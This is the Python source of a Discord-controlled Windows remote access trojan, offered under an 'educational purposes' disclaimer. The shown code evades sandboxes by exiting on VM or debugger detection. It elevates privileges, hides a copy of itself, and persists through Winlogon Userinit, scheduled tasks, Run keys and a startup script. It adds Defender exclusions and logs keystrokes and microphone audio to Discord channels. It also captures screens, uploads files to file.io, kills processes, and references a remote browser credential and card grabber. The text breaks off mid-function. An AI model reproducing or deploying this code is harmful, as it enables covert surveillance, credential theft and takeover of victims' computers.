#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
#
# This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3

GRAB_SCRIPT = "grab.py"
GRAB_MODES = ("all", "cookies", "history", "cards", "games", "discord", "discorddiag", "passwords", "vm")

import discord
import tempfile
import win32com.client
from discord.ext import commands
import os
import sys
import ctypes
import nacl.secret
import nacl.utils
import subprocess
import json
import sqlite3
import shutil
import time
import threading
import random
import string
import socket
import aiohttp
import aiosqlite
import requests
import builtins
import re
import winsound
import numpy as np
from datetime import datetime
from PIL import ImageGrab
import cv2
import wave
import pyautogui
from pynput import keyboard, mouse
import win32gui
import win32con
import win32api
import win32clipboard
import winreg
import asyncio
import psutil
from pathlib import Path
import math
import sounddevice as sd
from pycaw.pycaw import AudioUtilities
from pygrabber.dshow_graph import FilterGraph
from plyer import notification as plyer_notification
import io
import runpy
import uuid
import hashlib
import zipfile
import glob
import contextlib
import platform

VM_KILL = True

VM_PROCS = [
    "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "vmacthlp.exe", "vgauthservice.exe",
    "vboxservice.exe", "vboxtray.exe", "vboxhook.exe",
    "qemu-ga.exe", "xenservice.exe", "prl_cc.exe", "prl_tools.exe",
    "fakenet.exe", "dumpcap.exe", "wireshark.exe", "fiddler.exe", "httpdebuggerui.exe",
    "ida.exe", "ida64.exe", "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "x96dbg.exe",
    "procmon.exe", "procmon64.exe", "processhacker.exe", "pestudio.exe", "dnspy.exe",
    "ksdumper.exe", "ksdumperclient.exe", "joeboxcontrol.exe", "joeboxserver.exe",
]

VM_FILES = [
    r"C:\Windows\System32\vmGuestLib.dll",
    r"C:\Windows\System32\vm3dgl.dll",
    r"C:\Windows\System32\vboxhook.dll",
    r"C:\Windows\System32\vboxmrxnp.dll",
    r"C:\Windows\System32\vmsrvc.dll",
    r"C:\Windows\System32\drivers\vmsrvc.sys",
    r"C:\Windows\System32\drivers\vboxguest.sys",
    r"C:\Windows\System32\drivers\vmhgfs.sys",
]

VM_REG = [
    (r"SOFTWARE\VMware, Inc.\VMware Tools", None),
    (r"SOFTWARE\Oracle\VirtualBox Guest Additions", None),
    (r"SYSTEM\CurrentControlSet\Services\VBoxGuest", None),
    (r"SYSTEM\CurrentControlSet\Services\vmci", None),
    (r"SYSTEM\CurrentControlSet\Services\VBoxMouse", None),
]


def _vm_processes():
    try:
        import psutil
        return [(p.info.get("name") or "").lower() for p in psutil.process_iter(["name"])]
    except Exception:
        try:
            out = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=20,
                creationflags=0x08000000,
            ).stdout
            return [l.split(",")[0].strip('"').lower() for l in out.splitlines() if l.strip()]
        except Exception:
            return []


def vm_hits():
    hits = []

    procs = set(_vm_processes())
    for name in VM_PROCS:
        if name in procs:
            hits.append("proc:" + name)

    for f in VM_FILES:
        if os.path.exists(f):
            hits.append("file:" + os.path.basename(f))

    try:
        import winreg
        for path, _ in VM_REG:
            for hive in (winreg.HKEY_LOCAL_MACHINE,):
                try:
                    winreg.CloseKey(winreg.OpenKey(hive, path, 0, winreg.KEY_READ))
                    hits.append("reg:" + path.split("\\")[-1])
                except OSError:
                    pass
    except Exception:
        pass

    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            out = subprocess.run(
                ["wmic", "computersystem", "get", "model"],
                capture_output=True, text=True, timeout=15,
                creationflags=0x08000000,
            ).stdout.lower()
            for tag in ("vmware", "virtualbox", "virtual machine", "qemu", "xen", "parallels"):
                if tag in out:
                    hits.append("wmi:" + tag)
                    break
    except Exception:
        pass

    return hits


def vm_guard(code=0):
    if not VM_KILL:
        return []
    hits = vm_hits()
    if hits:
        try:
            sys.stdout.write("[vm] " + ", ".join(hits) + " -> exit\n")
            sys.stdout.flush()
        except Exception:
            pass
        os._exit(code)
    return []

vm_guard()

def _mutex_claim():
    global _MUTEX
    st = _state_read() or {}
    name = "Global\\" + (st.get("mutex") or _rand(14))
    _MUTEX = ctypes.windll.kernel32.CreateMutexW(None, False, name)
    return ctypes.windll.kernel32.GetLastError() != 183


def _mutex_release():
    try:
        ctypes.windll.kernel32.CloseHandle(_MUTEX)
    except Exception:
        pass

voice_client = None
voice_reconnect = True

try:
    import imageio_ffmpeg
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "imageio-ffmpeg"])
    import imageio_ffmpeg

FFMPEG_BIN = imageio_ffmpeg.get_ffmpeg_exe()
_voice_gen = 0
_dshow_cache = {"t": 0.0, "devs": []}

def list_dshow_audio_devices():
    if time.time() - _dshow_cache["t"] < 30 and _dshow_cache["devs"]:
        return _dshow_cache["devs"]
    devs = []
    try:
        r = subprocess.run(
            [FFMPEG_BIN, "-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            creationflags=subprocess.CREATE_NO_WINDOW, timeout=15
        )
        text = (r.stdout or "") + (r.stderr or "")
        in_audio = False
        for line in text.splitlines():
            if "DirectShow audio devices" in line:
                in_audio = True
                continue
            if "DirectShow video devices" in line:
                in_audio = False
                continue
            if in_audio:
                m = re.search(r'"([^"]+)"', line)
                if m:
                    devs.append(m.group(1))
    except Exception:
        pass
    _dshow_cache.update(t=time.time(), devs=devs)
    return devs


def _match_dshow(name):
    devs = list_dshow_audio_devices()
    if not devs:
        return name
    low = (name or "").lower()
    for d in devs:
        if d.lower() == low:
            return d
    tokens = [t for t in re.split(r"[^a-z0-9]+", low) if len(t) > 2]

    def score(d):
        dl = d.lower()
        return sum(2 if t in dl else 0 for t in tokens)

    best = max(devs, key=score)
    return best if score(best) else devs[0]


def _dshow_source(device_name):
    return 'audio="{}"'.format(device_name.replace('"', r'\"'))


def _pick_mic():
    mics = get_input_devices()
    if not mics:
        return None
    if selected_mic is not None:
        for m in mics:
            if m["index"] == selected_mic:
                return m["name"]
    return mics[0]["name"]


def _start_stream(client):
    name = _match_dshow(_pick_mic())
    src = discord.FFmpegPCMAudio(
        source=_dshow_source(name),
        executable=FFMPEG_BIN,
        before_options="-f dshow -rtbufsize 100M -thread_queue_size 1024",
        options="-ac 2 -ar 48000 -af aresample=async=1",
    )
    client.play(src, after=_after_stream)
    return name


def _after_stream(err):
    if err:
        print(f"[voice] ffmpeg: {err}")


def _voice_watchdog(gen):
    while voice_reconnect and gen == _voice_gen:
        time.sleep(3)
        try:
            vc = voice_client
            if vc and vc.is_connected() and not vc.is_playing() and not vc.is_paused():
                _start_stream(vc)
        except Exception:
            pass

ELEVATED_FLAG = "--zz-elev"
_CNW = 0x08000000

WINLOGON_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
USERINIT_KEY = WINLOGON_KEY
RUN_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

WINDIR = os.environ.get("WINDIR") or r"C:\Windows"
PDATA = os.environ.get("ProgramData") or r"C:\ProgramData"
APPDATA = os.environ.get("APPDATA", os.path.expanduser("~"))

PERSIST_BASES = [
    os.path.join(WINDIR, "System32"),
    os.path.join(PDATA, "Microsoft", "Windows", "Caches"),
    os.path.join(PDATA, "Microsoft"),
    os.path.join(PDATA, "Windows"),
]

_MUTEX = None
APP_DIR = ""
_LEGACY_STATE = os.path.join(PDATA, "ZZZ_Security", "state.json")


def _is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _ps(cmd):
    try:
        return subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
             "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; " + cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            creationflags=_CNW)
    except Exception:
        return None

def _machine_seed():
    try:
        return str(uuid.getnode())
    except Exception:
        return socket.gethostname()


def _hide(path, hidden=True):
    try:
        subprocess.run(
            ["attrib", "+h" if hidden else "-h", "+s" if hidden else "-s", str(path)],
            capture_output=True, creationflags=_CNW
        )
    except Exception:
        pass

def _rand(n):
    a = string.ascii_letters + string.digits
    r = random.SystemRandom()
    return "".join(r.choice(a) for _ in range(n))


def _anchor():
    h = hashlib.md5(_machine_seed().encode("utf-8", "replace")).hexdigest()[:12]
    return os.path.join(PDATA, "Microsoft", "Windows", "Caches", h + ".json")


def _app_db():
    return os.path.join(APP_DIR or APPDATA, "data.db")


def _state_read():
    for f in (_anchor(), _LEGACY_STATE):
        try:
            with open(f, "r", encoding="utf-8") as fh:
                d = json.load(fh)
            if d.get("dir") and d.get("exe") and d.get("task") and d.get("mutex"):
                return d
        except Exception:
            pass
    return None


def _state_write(d):
    try:
        os.makedirs(os.path.dirname(_anchor()), exist_ok=True)
        with open(_anchor(), "w", encoding="utf-8") as fh:
            json.dump(d, fh)
        _hide(_anchor(), True)
    except Exception:
        pass
    if not APP_DIR:
        return
    try:
        os.makedirs(APP_DIR, exist_ok=True)
        conn = sqlite3.connect(os.path.join(APP_DIR, "data.db"))
        conn.execute("CREATE TABLE IF NOT EXISTS persist (key TEXT PRIMARY KEY, value TEXT)")
        for k, v in d.items():
            conn.execute("INSERT OR REPLACE INTO persist VALUES (?, ?)", (k, str(v)))
        conn.commit()
        conn.close()
    except Exception:
        pass


def _ensure_state():
    st = _state_read()
    if st:
        return st
    base = random.SystemRandom().choice(PERSIST_BASES)
    d = Path(base) / _rand(10)
    st = {
        "dir": str(d),
        "exe": str(d / (_rand(9) + ".exe")),
        "task": _rand(12),
        "mutex": _rand(14),
        "appdir": _rand(11),
        "created": int(time.time()),
    }
    _state_write(st)
    return st


def _targets():
    st = _ensure_state()
    return st["task"], Path(st["dir"]), Path(st["exe"])


def _lock_dir(d):
    try:
        subprocess.run(
            ["icacls", str(d), "/inheritance:r",
             "/grant:r", "*S-1-5-18:(OI)(CI)F",
             "/grant:r", "*S-1-5-32-544:(OI)(CI)F",
             "/grant:r", "*S-1-5-32-545:(OI)(CI)RX"],
            capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _unlock_dir(d):
    try:
        subprocess.run(["icacls", str(d), "/inheritance:e"], capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _reg_add(key, name, value, typ="REG_SZ", hive="HKLM"):
    try:
        root = winreg.HKEY_LOCAL_MACHINE if hive.upper() == "HKLM" else winreg.HKEY_CURRENT_USER
        t = winreg.REG_SZ if typ == "REG_SZ" else winreg.REG_DWORD
        v = value if typ == "REG_SZ" else int(value)
        k = winreg.CreateKeyEx(root, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, name, 0, t, v)
        winreg.CloseKey(k)
        return True
    except Exception:
        pass
    try:
        h = "HKLM" if hive.upper() == "HKLM" else "HKCU"
        r = subprocess.run(["reg", "add", f"{h}\\{key}", "/v", name, "/t", typ,
                            "/d", str(value), "/f"], capture_output=True, creationflags=_CNW)
        return r.returncode == 0
    except Exception:
        return False


def _reg_query(key, name, hive="HKLM"):
    try:
        root = winreg.HKEY_LOCAL_MACHINE if hive.upper() == "HKLM" else winreg.HKEY_CURRENT_USER
        k = winreg.OpenKey(root, key, 0, winreg.KEY_QUERY_VALUE)
        v, _ = winreg.QueryValueEx(k, name)
        winreg.CloseKey(k)
        return v
    except Exception:
        return None


def _reg_delete(key, name, hive="HKLM"):
    try:
        h = "HKLM" if hive.upper() == "HKLM" else "HKCU"
        subprocess.run(["reg", "delete", f"{h}\\{key}", "/v", name, "/f"],
                       capture_output=True, creationflags=_CNW)
    except Exception:
        pass


def _startup_dir():
    return os.path.join(os.environ.get("APPDATA", ""),
                        r"Microsoft\Windows\Start Menu\Programs\Startup")


def _make_launcher(exe, folder):
    lines = [
        'Set sh = CreateObject("WScript.Shell")',
        f'exe = "{exe}"',
        f'sh.CurrentDirectory = "{os.path.dirname(exe)}"',
        "WScript.Sleep 40000",
        'sh.Run """" & exe & """", 0, False',
        "For i = 1 To 60",
        "  WScript.Sleep 60000",
        '  Set svc = GetObject("winmgmts:\\.\\root\\cimv2")',
        f'  Set col = svc.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=\'{os.path.basename(exe)}\'")',
        '  If col.Count = 0 Then sh.Run """" & exe & """", 0, False',
        "Next",
    ]
    path = os.path.join(_startup_dir(), folder + ".vbs")
    try:
        with open(path, "w", encoding="utf-8", newline="\r\n") as f:
            f.write("\r\n".join(lines) + "\r\n")
        _hide(path, True)
    except Exception:
        pass


def _task_create(name, exe, sc, extra=()):
    subprocess.run(
        ["schtasks", "/Create", "/TN", name, "/TR", f'cmd /c start "" /min "{exe}"',
         "/SC", sc, "/RL", "HIGHEST", "/F", *extra],
        capture_output=True, creationflags=_CNW)


def install_userinit():
    exe = _ensure_state()["exe"]
    cur = _reg_query(WINLOGON_KEY, "Userinit") or r"C:\Windows\System32\userinit.exe,"
    if exe.lower() not in cur.lower():
        _reg_add(WINLOGON_KEY, "Userinit", f'"{exe}", C:\\Windows\\System32\\userinit.exe,')
    for v in ("AutoAdminLogon", "DefaultUserName", "DefaultPassword",
              "DisableCAD", "AutoRestartShell"):
        _reg_delete(WINLOGON_KEY, v)

def uninstall_userinit():
    exe = (_state_read() or {}).get("exe")
    cur = _reg_query(WINLOGON_KEY, "Userinit")
    if not cur:
        return
    if exe and exe.lower() not in cur.lower():
        return
    _reg_add(WINLOGON_KEY, "Userinit", r"C:\Windows\System32\userinit.exe,")


def setup_persistence():
    st = _ensure_state()
    target_dir = Path(st["dir"])
    target_exe = Path(st["exe"])
    folder = st["task"]

    current = Path(sys.executable) if getattr(sys, "frozen", False) else Path(__file__).resolve()

    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass

    try:
        if not target_exe.exists() or current.resolve() != target_exe.resolve():
            shutil.copy2(str(current), str(target_exe))
    except Exception:
        pass

    _hide(target_exe, True)
    _hide(target_dir, True)

    if not _is_admin():
        return

    _lock_dir(target_dir)
    install_userinit()

    _task_create(folder, target_exe, "ONLOGON", ("/DELAY", "0000:45"))
    _task_create(folder + "_b", target_exe, "ONSTART")

    _reg_add(RUN_KEY, folder, f'"{target_exe}"', hive="HKLM")
    _reg_add(RUN_KEY, folder, f'"{target_exe}"', hive="HKCU")

    _make_launcher(str(target_exe), folder)

    _ps(f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue')
    _ps(f'Add-MpPreference -ExclusionProcess "{target_exe.name}" -ErrorAction SilentlyContinue')

def _mutex_release():
    try:
        ctypes.windll.kernel32.CloseHandle(_MUTEX)
    except Exception:
        pass


def boot():
    global APP_DIR
    st = _ensure_state()
    APP_DIR = os.path.join(APPDATA, st.get("appdir") or _rand(11))
    try:
        os.makedirs(APP_DIR, exist_ok=True)
    except Exception:
        pass
    _state_write(st)

    if not _mutex_claim():
        os._exit(0)

    if not _is_admin() and ELEVATED_FLAG not in sys.argv:
        ok = False
        try:
            params = ELEVATED_FLAG if getattr(sys, "frozen", False) else \
                     f'{ELEVATED_FLAG} "{Path(__file__).resolve()}"'
            r = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            ok = int(r) > 32
        except Exception:
            ok = False
        if ok:
            _mutex_release()
            os._exit(0)

boot()

def _app_base():
    if getattr(sys, "frozen", False):
        return getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
    return os.path.dirname(os.path.abspath(__file__))


RESOURCES_DIR = os.path.join(_app_base(), "resources")


def resource_path(name):
    return os.path.join(RESOURCES_DIR, name)

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

BASE_DIR = APP_DIR
DB_PATH = os.path.join(BASE_DIR, "data.db")
ICON_PATH = os.path.join(BASE_DIR, "icon.png")

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

current_dir = os.path.expanduser("~")
keylogger_active = True
keylogger_buffer = []
last_key_time = time.time()
selected_camera = 0
selected_mic = None
input_blocked = False
keyboard_listener = None
mouse_listener = None
critical_process = False

ACCENT = 0x0084ff

ACCENT_PRESETS = {
    "blue": 0x0084FF, "red": 0xFF0000, "green": 0x00FF00, "purple": 0x9B59B6,
    "orange": 0xFF8C00, "pink": 0xFF69B4, "cyan": 0x00FFFF, "yellow": 0xFFD700,
    "teal": 0x1ABC9C, "white": 0xFFFFFF, "lime": 0x32CD32, "gold": 0xFFD700,
    "magenta": 0xFF00FF, "grey": 0x95A5A6, "discord": 0x5865F2, "crimson": 0xDC143C,
}

JUMPSCARE_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/jump.mp4"
GRABBER_URL = "https://github.com/MateAGYT/LessMi/raw/main/resources/grab.py"

auto_click = False
auto_click_delete = False

def resolve(path):
    if not path:
        return current_dir
    return os.path.abspath(path if os.path.isabs(path) else os.path.join(current_dir, path))

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (process_name TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS blocked_domains (domain TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def create_embed(title, description, color=None):
    embed = discord.Embed(title=title, description=description,
                          color=ACCENT if color is None else color, timestamp=datetime.now())
    if os.path.exists(ICON_PATH):
        embed.set_footer(text="MateAGYT/LessMi", icon_url="https://github.com/MateAGYT/LessMi/raw/main/logo.png")
    else:
        embed.set_footer(text="MateAGYT/LessMi")
    return embed

def screenshot_all():
    try:
        img = ImageGrab.grab(all_screens=True)
        path = os.path.join(BASE_DIR, "ss.png")
        img.save(path)
        return path
    except Exception:
        return None


def list_cameras():
    cams = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            ret, _ = cap.read()
            if ret:
                cams.append(i)
            cap.release()
    return cams


def get_input_devices():
    devices = sd.query_devices()
    mics = []
    for i, d in enumerate(devices):
        if d["max_input_channels"] > 0:
            name = d["name"].strip()
            if name:
                mics.append({"index": i, "name": name})
    return mics


def current_mic_name():
    mics = get_input_devices()
    if not mics:
        return None
    if selected_mic is not None:
        for m in mics:
            if m["index"] == selected_mic:
                return m["name"]
    return mics[0]["name"]


def set_volume_level(level):
    try:
        val = max(0.0, min(1.0, float(level)))
        ps_code = f"""
$code = @'
using System;
using System.Runtime.InteropServices;

namespace Audio {{
    public class Volume {{
        [DllImport("MMDevApi.dll")]
        private static extern int MMDeviceEnumerator_CreateInstance(ref Guid riid, int dwClsCtx, IntPtr pActivationParams, out IntPtr ppInterface);

        [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IAudioEndpointVolume {{
            int RegisterControlChangeNotify(IntPtr pNotify);
            int UnregisterControlChangeNotify(IntPtr pNotify);
            int GetChannelCount(out uint pnChannelCount);
            int SetMasterVolumeLevel(float fLevelDB, ref Guid pguidEventContext);
            int SetMasterVolumeLevelScalar(float fLevel, ref Guid pguidEventContext);
        }}

        [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IMMDeviceEnumerator {{
            int EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices);
            int GetDefaultAudioEndpoint(int dataFlow, int role, out IntPtr ppEndpoint);
        }}

        [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IMMDevice {{
            int Activate(ref Guid iid, int dwClsCtx, IntPtr pActivationParams, [MarshalAs(UnmanagedType.IUnknown)] out object ppInterface);
        }}

        public static void SetVolume(float level) {{
            Guid CLSID_MMDeviceEnumerator = new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E");
            Guid IID_IMMDeviceEnumerator = new Guid("A95664D2-9614-4F35-A746-DE8DB63617E6");
            Guid IID_IAudioEndpointVolume = new Guid("5CDF2C82-841E-4546-9722-0CF74078229A");

            Type type = Type.GetTypeFromCLSID(CLSID_MMDeviceEnumerator);
            IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)Activator.CreateInstance(type);
            IntPtr devPtr;
            enumerator.GetDefaultAudioEndpoint(0, 1, out devPtr);
            IMMDevice device = (IMMDevice)Marshal.GetObjectForIUnknown(devPtr);
            object volObj;
            device.Activate(ref IID_IAudioEndpointVolume, 23, IntPtr.Zero, out volObj);
            IAudioEndpointVolume volume = (IAudioEndpointVolume)volObj;
            Guid g = Guid.Empty;
            volume.SetMasterVolumeLevelScalar(level, ref g);
        }}
    }}
}}
'@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
[Audio.Volume]::SetVolume({val})
"""
        subprocess.run(["powershell", "-NoProfile", "-Command", ps_code],
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception:
        return False


def keylogger_thread():
    global keylogger_buffer, last_key_time

    def on_press(key):
        global last_key_time
        if not keylogger_active:
            return
        try:
            keylogger_buffer.append(key.char)
        except AttributeError:
            specials = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.tab: " [TAB] ",
                keyboard.Key.esc: " [ESC] ",
                keyboard.Key.caps_lock: " [CAPS] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.shift_r: " [RIGHT_SHIFT] ",
            }
            keylogger_buffer.append(specials.get(key, f" [{key}] "))
        last_key_time = time.time()

    while True:
        try:
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except Exception:
            time.sleep(1)


def flush_keylog():
    global keylogger_buffer
    if not keylogger_buffer:
        return False
    text = "".join(keylogger_buffer)
    keylogger_buffer = []
    try:
        asyncio.run_coroutine_threadsafe(send_keylog_to_discord(text), bot.loop)
        return True
    except Exception:
        return False


def send_keys_periodically():
    while True:
        time.sleep(60)
        if keylogger_active:
            flush_keylog()


async def send_keylog_to_discord(text):
    for guild in bot.guilds:
        keys_ch = guild.get_channel(cfg_get(guild.id, "keys"))
        if keys_ch:
            for chunk in [text[i:i + 1900] for i in range(0, len(text), 1900)]:
                await keys_ch.send(f"```\n{chunk}\n```")


def record_and_send(duration=60):
    fs = 44100
    device = selected_mic
    rec = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype=np.int16, device=device)
    sd.wait()
    filename = os.path.join(BASE_DIR, f"mic_{int(time.time())}.wav")
    with wave.open(filename, "wb") as wf:
        wf.setnchannels(2)
        wf.setsampwidth(2)
        wf.setframerate(fs)
        wf.writeframes(rec.tobytes())
    asyncio.run_coroutine_threadsafe(send_recording(filename), bot.loop)


def record_mic_thread():
    while True:
        time.sleep(120)
        try:
            record_and_send(60)
        except Exception:
            pass


async def send_recording(filename):
    for guild in bot.guilds:
        mic_ch = guild.get_channel(cfg_get(guild.id, "microphone"))
        if mic_ch:
            try:
                await mic_ch.send(file=discord.File(filename))
            except Exception:
                pass
    try:
        os.remove(filename)
    except Exception:
        pass

BLACKLIST = set()
_bl_lock = threading.Lock()


def bl_load():
    try:
        conn = sqlite3.connect(DB_PATH)
        rows = conn.execute("SELECT process_name FROM blacklist").fetchall()
        conn.close()
        with _bl_lock:
            BLACKLIST.clear()
            BLACKLIST.update(str(r[0]).lower() for r in rows if r[0])
    except Exception:
        pass


def bl_has(name):
    with _bl_lock:
        return (name or "").lower() in BLACKLIST


def _bl_sweep():
    if not BLACKLIST:
        return
    try:
        for p in psutil.process_iter(["name"]):
            try:
                if bl_has(p.info.get("name")):
                    p.kill()
            except Exception:
                pass
    except Exception:
        pass


def _bl_wmi_loop():
    locator = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    svc = locator.ConnectServer(".", "root\\cimv2")
    watcher = svc.ExecNotificationQuery("SELECT * FROM Win32_ProcessStartTrace")
    while True:
        try:
            ev = watcher.NextEvent(1500)
        except Exception:
            _bl_sweep()
            continue
        if bl_has(ev.ProcessName):
            try:
                psutil.Process(ev.ProcessID).kill()
            except Exception:
                pass


def blacklist_watcher():
    bl_load()
    while True:
        try:
            _bl_wmi_loop()
        except Exception:
            _bl_sweep()
            time.sleep(0.4)

def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return millis / 1000.0


def tree_directory(path, prefix=""):
    lines = []
    try:
        entries = sorted(os.listdir(path))
        for i, entry in enumerate(entries):
            full_path = os.path.join(path, entry)
            is_last = i == len(entries) - 1
            current = "└── " if is_last else "├── "
            lines.append(prefix + current + entry)
            if os.path.isdir(full_path):
                extension = "    " if is_last else "│   "
                lines.extend(tree_directory(full_path, prefix + extension))
    except Exception:
        pass
    return lines


def upload_fileio(filepath):
    try:
        with open(filepath, "rb") as f:
            response = requests.post("https://file.io", files={"file": f})
            return response.json().get("link")
    except Exception:
        return None


def enum_windows():
    titles = []

    def cb(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            t = win32gui.GetWindowText(hwnd)
            if t:
                titles.append(t)
        return True

    win32gui.EnumWindows(cb, None)
    return titles


import win32gui
import win32con
import win32api
import random
import time
import math

def flash_screen(effect):
    hdc = win32gui.GetDC(0)
    width, height = win32api.GetSystemMetrics(0), win32api.GetSystemMetrics(1)
    
    if effect == "list":
        return [
            "invert\n", "noise\n", "lines\n", "invert_squares\n", "color_squares\n",
            "diagonal_lines\n", "snowfall\n", "hypnotic_spirals\n", "random_lines\n",
            "screen_collapse\n", "glitch_tunnel\n", "block_glitch\n", "matrix_rain\n",
            "pixel_melter\n", "vhs_static\n", "pixelate_wave\n", "rgb_split\n",
            "screen_shake\n", "corrupted_text_bars\n", "vortex_twirl\n", "scanline_flicker\n",
            "mirror_dimension\n", "screen_fracture\n", "color_bleed\n", "horizontal_tear\n",
            "digital_earthquake\n", "checkerboard_void\n", "strobe_stripes\n", "pixel_explosion\n",
            "wave_distortion\n", "quad_mirror\n", "crt_defrag\n", "vhs_tracking_loss\n",
            "invert_sweep\n", "static_snow_storm\n", "kaleidoscope_glitch\n", "screen_fold\n",
            "hologram_flicker\n", "blackhole_siphon\n", "corrupted_grid\n"
        ]
    
    elif effect == "invert":
        start_time = time.time()
        while time.time() - start_time < 10:
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.PATINVERT)
            time.sleep(0.01)
            
    elif effect == "noise":
        for _ in range(5000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            size = random.randint(20, 150)
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, size, size, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)
            
    elif effect == "lines":
        for _ in range(50):
            step = random.randint(2, 10)
            for y_pos in range(0, height, step):
                win32gui.PatBlt(hdc, 0, y_pos, width, random.randint(1, 5), win32con.PATINVERT)
            time.sleep(0.05)
            
    elif effect == "invert_squares":
        for _ in range(1500):
            rx1 = random.randint(0, width)
            ry1 = random.randint(0, height)
            w_box = random.randint(50, 400)
            h_box = random.randint(50, 400)
            win32gui.PatBlt(hdc, rx1, ry1, w_box, h_box, win32con.PATINVERT)
            
    elif effect == "color_squares":
        for _ in range(3000):
            x_pos = random.randint(0, width)
            y_pos = random.randint(0, height)
            size = random.choice([10, 20, 40, 80])
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x_pos, y_pos, size, size, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)
            
    elif effect == "diagonal_lines":
        for _ in range(300):
            x_pos = random.randint(0, width)
            y_pos = random.randint(0, height)
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, x_pos, 0, random.randint(1, 4), height, win32con.PATCOPY)
            win32gui.PatBlt(hdc, 0, y_pos, width, random.randint(1, 4), win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)
            
    elif effect == "snowfall":
        for _ in range(50):
            stars = [(random.randint(0, width), random.randint(0, height), random.randint(2, 8)) for _ in range(300)]
            brush = win32gui.CreateSolidBrush(win32api.RGB(255, 255, 255))
            old_brush = win32gui.SelectObject(hdc, brush)
            for rx, ry, size in stars:
                win32gui.PatBlt(hdc, rx, ry, size, size, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)
            time.sleep(0.05)
            
    elif effect == "hypnotic_spirals":
        for angle in range(0, 1080, 5):
            radius = 1000
            rad = math.radians(angle)
            x1 = int(width / 2 + radius * math.cos(rad))
            y1 = int(height / 2 - radius * math.sin(rad))
